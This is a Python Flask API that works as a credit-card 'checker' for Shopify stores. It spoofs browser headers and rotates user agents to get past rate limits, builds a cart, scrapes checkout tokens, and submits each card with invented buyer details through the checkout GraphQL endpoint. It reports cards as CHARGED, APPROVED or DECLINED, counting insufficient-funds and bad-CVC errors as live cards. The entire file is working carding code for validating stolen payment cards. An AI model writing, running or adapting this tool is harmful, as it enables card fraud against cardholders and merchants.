#!/usr/bin/env python3
from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import httpx
import random
import re
import json
import os
import time
from urllib.parse import urlparse
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ============================================================
# REAL BROWSER HEADERS
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

class ShopifyChecker:
    def __init__(self):
        self.user_agent = random.choice(USER_AGENTS)
    
    def get_headers(self, extra=None):
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        if extra:
            headers.update(extra)
        return headers

    async def check_card(self, site_url, card):
        start_time = time.time()
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=60.0) as session:
            try:
                parts = card.split('|')
                if len(parts) != 4:
                    return {"status": "ERROR", "message": "Invalid format"}
                
                cc, mon, year, cvv = parts
                
                # ============================================
                # STEP 1: WARM UP SESSION
                # ============================================
                headers = self.get_headers()
                await session.get(site_url, headers=headers)
                await asyncio.sleep(random.uniform(1.0, 2.0))
                
                # Visit collections page
                try:
                    await session.get(f"{site_url}/collections/all", headers=headers)
                except:
                    pass
                await asyncio.sleep(random.uniform(0.5, 1.0))
                
                # ============================================
                # STEP 2: GET PRODUCT WITH RETRY
                # ============================================
                json_headers = self.get_headers({'Accept': 'application/json'})
                product_data = None
                variant_id = None
                product_handle = None
                price = "0.00"
                
                # Try multiple methods
                methods = [
                    # Method 1: /products.json
                    lambda: session.get(f"{site_url}/products.json", headers=json_headers),
                    # Method 2: /collections/all/products.json
                    lambda: session.get(f"{site_url}/collections/all/products.json", headers=json_headers),
                    # Method 3: /products?limit=1
                    lambda: session.get(f"{site_url}/products?limit=1", headers=json_headers),
                ]
                
                for method_idx, method in enumerate(methods):
                    for attempt in range(3):
                        try:
                            resp = await method()
                            
                            if resp.status_code == 429:
                                wait = random.uniform(8.0, 15.0)
                                print(f"⏳ 429 - Waiting {wait:.1f}s...")
                                await asyncio.sleep(wait)
                                # Rotate user agent
                                self.user_agent = random.choice(USER_AGENTS)
                                json_headers['User-Agent'] = self.user_agent
                                continue
                            
                            if resp.status_code == 200:
                                try:
                                    data = resp.json()
                                    products = data.get('products', [])
                                    if products and len(products) > 0:
                                        product_data = products[0]
                                        variant_id = product_data['variants'][0]['id']
                                        product_handle = product_data['handle']
                                        price = product_data['variants'][0]['price']
                                        print(f"✅ Found product using method {method_idx + 1}")
                                        break
                                except:
                                    pass
                            
                            if resp.status_code == 404:
                                continue
                                
                        except Exception as e:
                            print(f"⚠️ Method {method_idx + 1} attempt {attempt + 1} failed: {str(e)[:50]}")
                            continue
                    
                    if product_data:
                        break
                
                # If no product found, try HTML scraping
                if not product_data:
                    print("🔄 Trying HTML scraping...")
                    try:
                        resp = await session.get(site_url, headers=headers)
                        html = resp.text
                        # Find product handle in HTML
                        handle_match = re.search(r'/products/([a-zA-Z0-9\-]+)', html)
                        if handle_match:
                            product_handle = handle_match.group(1)
                            # Try to get product JSON
                            resp = await session.get(f"{site_url}/products/{product_handle}.json", headers=json_headers)
                            if resp.status_code == 200:
                                data = resp.json()
                                product_data = data.get('product', {})
                                if product_data:
                                    variant_id = product_data['variants'][0]['id']
                                    price = product_data['variants'][0]['price']
                                    print(f"✅ Found product via HTML scraping: {product_handle}")
                    except:
                        pass
                
                if not product_data or not variant_id:
                    return {
                        "status": "ERROR",
                        "message": "No product found on store",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 3: ADD TO CART
                # ============================================
                await asyncio.sleep(random.uniform(0.5, 1.0))
                
                cart_headers = self.get_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/products/{product_handle}" if product_handle else site_url
                })
                
                resp = await session.post(
                    site_url + '/cart/add.js',
                    headers=cart_headers,
                    data={'id': str(variant_id), 'quantity': '1'}
                )
                
                if resp.status_code != 200:
                    return {
                        "status": "ERROR",
                        "message": f"Cart add failed: {resp.status_code}",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                await asyncio.sleep(random.uniform(0.5, 1.0))
                
                # ============================================
                # STEP 4: GET CART TOKEN
                # ============================================
                resp = await session.get(f"{site_url}/cart.js", headers=headers)
                try:
                    cart_data = resp.json()
                    token = cart_data.get('token')
                    if not token:
                        return {
                            "status": "ERROR",
                            "message": "No cart token",
                            "time": f"{time.time() - start_time:.1f}s"
                        }
                except:
                    return {
                        "status": "ERROR",
                        "message": "Invalid cart response",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 5: INITIATE CHECKOUT
                # ============================================
                checkout_headers = self.get_headers({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': f"{site_url}/cart"
                })
                
                await session.get(f"{site_url}/checkout", headers=checkout_headers)
                await asyncio.sleep(random.uniform(0.3, 0.8))
                
                resp = await session.post(
                    f"{site_url}/cart",
                    headers=checkout_headers,
                    data={'checkout': '', 'updates[]': '1'}
                )
                
                html = resp.text
                
                # ============================================
                # STEP 6: EXTRACT TOKENS
                # ============================================
                session_token_match = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
                    html
                )
                
                if not session_token_match:
                    return {
                        "status": "ERROR",
                        "message": "Token extraction failed",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                session_token = session_token_match.group(1)
                
                # Extract other tokens
                def find_between(s, start, end):
                    try:
                        if start in s and end in s:
                            return (s.split(start))[1].split(end)[0]
                        return ""
                    except:
                        return ""
                
                queue_token = find_between(html, 'queueToken&quot;:&quot;', '&quot;')
                stable_id = find_between(html, 'stableId&quot;:&quot;', '&quot;')
                payment_id = find_between(html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
                
                # ============================================
                # STEP 7: GET RANDOM INFO
                # ============================================
                addresses = [
                    {"add1": "123 Main St", "city": "Portland", "state_short": "ME", "zip": "04101"},
                    {"add1": "456 Oak Ave", "city": "Portland", "state_short": "ME", "zip": "04102"},
                    {"add1": "789 Pine Rd", "city": "Portland", "state_short": "ME", "zip": "04103"},
                    {"add1": "777 Broadway", "city": "New York", "state_short": "NY", "zip": "10001"},
                ]
                addr = random.choice(addresses)
                fname = random.choice(["John", "Emily", "Alex", "Sarah", "Michael", "Jessica"])
                lname = random.choice(["Smith", "Johnson", "Williams", "Brown", "Garcia"])
                email = f"{fname.lower()}.{lname.lower()}{random.randint(1,999)}@gmail.com"
                phone = random.choice(["2025550199", "3105551234", "4155559876"])
                
                # ============================================
                # STEP 8: PAYMENT SESSION
                # ============================================
                session_id = None
                for endpoint in ["https://deposit.us.shopifycs.com/sessions", "https://checkout.shopifycs.com/sessions"]:
                    try:
                        resp = await session.post(endpoint, headers={
                            'Accept': 'application/json',
                            'Content-Type': 'application/json',
                            'User-Agent': self.user_agent,
                            'Origin': 'https://checkout.shopifycs.com'
                        }, json={
                            'credit_card': {
                                'number': cc,
                                'month': mon,
                                'year': year,
                                'verification_value': cvv,
                                'name': f"{fname} {lname}"
                            },
                            'payment_session_scope': urlparse(site_url).netloc
                        })
                        if resp.status_code == 200:
                            data = resp.json()
                            if 'id' in data:
                                session_id = data['id']
                                break
                    except:
                        continue
                
                if not session_id:
                    return {
                        "status": "ERROR",
                        "message": "Payment session failed",
                        "time": f"{time.time() - start_time:.1f}s"
                    }
                
                # ============================================
                # STEP 9: GRAPHQL SUBMIT
                # ============================================
                gql_headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': site_url,
                    'User-Agent': self.user_agent,
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-source-id': token,
                }
                
                gql_payload = {
                    'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on FailedReceipt{id processingError{code __typename}__typename}__typename}',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': session_token},
                            'queueToken': queue_token,
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True}
                                        },
                                        'options': {}
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': addr['add1'], 'address2': '',
                                            'city': addr['city'], 'countryCode': 'US',
                                            'postalCode': addr['zip'],
                                            'firstName': fname, 'lastName': lname,
                                            'zoneCode': addr['state_short'], 'phone': phone
                                        }
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True}
                                }],
                                'noDeliveryRequired': []
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}'
                                        }
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True}
                                }]
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': payment_id,
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': addr['add1'], 'city': addr['city'],
                                                    'countryCode': 'US', 'postalCode': addr['zip'],
                                                    'firstName': fname, 'lastName': lname,
                                                    'zoneCode': addr['state_short'], 'phone': phone
                                                }
                                            }
                                        }
                                    },
                                    'amount': {'any': True}
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': addr['add1'], 'city': addr['city'],
                                        'countryCode': 'US', 'postalCode': addr['zip'],
                                        'firstName': fname, 'lastName': lname,
                                        'zoneCode': addr['state_short'], 'phone': phone
                                    }
                                }
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': email}}
                            },
                            'taxes': {
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}
                            }
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'analytics': {'requestUrl': f'{site_url}/checkouts/cn/{token}'}
                    }
                }
                
                resp = await session.post(
                    f"{site_url}/checkouts/unstable/graphql",
                    headers=gql_headers,
                    json=gql_payload
                )
                
                elapsed = time.time() - start_time
                
                if resp.status_code != 200:
                    return {
                        "status": "ERROR",
                        "message": f"GraphQL failed: {resp.status_code}",
                        "time": f"{elapsed:.1f}s"
                    }
                
                data = resp.json()
                completion = data.get('data', {}).get('submitForCompletion', {})
                
                if completion.get('__typename') == 'SubmitSuccess':
                    receipt = completion.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return {
                            "status": "CHARGED",
                            "message": "ORDER_PLACED",
                            "order_id": receipt.get('token'),
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                    elif receipt.get('__typename') == 'ActionRequiredReceipt':
                        return {
                            "status": "APPROVED",
                            "message": "3DS_REQUIRED",
                            "price": price,
                            "time": f"{elapsed:.1f}s"
                        }
                
                elif completion.get('__typename') == 'SubmitRejected':
                    errors = completion.get('errors', [])
                    for error in errors:
                        code = error.get('code', '')
                        if 'INSUFFICIENT_FUNDS' in code:
                            return {"status": "APPROVED", "message": "INSUFFICIENT_FUNDS", "price": price, "time": f"{elapsed:.1f}s"}
                        elif 'CVC' in code or 'CVV' in code:
                            return {"status": "APPROVED", "message": "INCORRECT_CVC", "price": price, "time": f"{elapsed:.1f}s"}
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
                else:
                    return {"status": "DECLINED", "message": "CARD_DECLINED", "price": price, "time": f"{elapsed:.1f}s"}
                
            except Exception as e:
                return {"status": "ERROR", "message": str(e)[:100], "time": f"{time.time() - start_time:.1f}s"}

@app.route('/', methods=['GET'])
def home():
    return jsonify({'status': 'online', 'version': '6.0', 'endpoint': '/check'})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'})

@app.route('/check', methods=['POST'])
def check():
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'Missing JSON'}), 400
        site = data.get('site')
        cc = data.get('cc')
        if not site or not cc:
            return jsonify({'error': 'Missing site or cc'}), 400
        if not site.startswith('http'):
            site = 'https://' + site
        result = asyncio.run(ShopifyChecker().check_card(site, cc))
        return jsonify({'site': site, 'cc': cc, 'result': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/shopify', methods=['GET', 'POST'])
def shopify():
    if request.method == 'GET':
        site = request.args.get('site')
        cc = request.args.get('cc')
        if site and cc:
            data = {'site': site, 'cc': cc}
            request._cached_json = (data,)
            return check()
    return check()

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
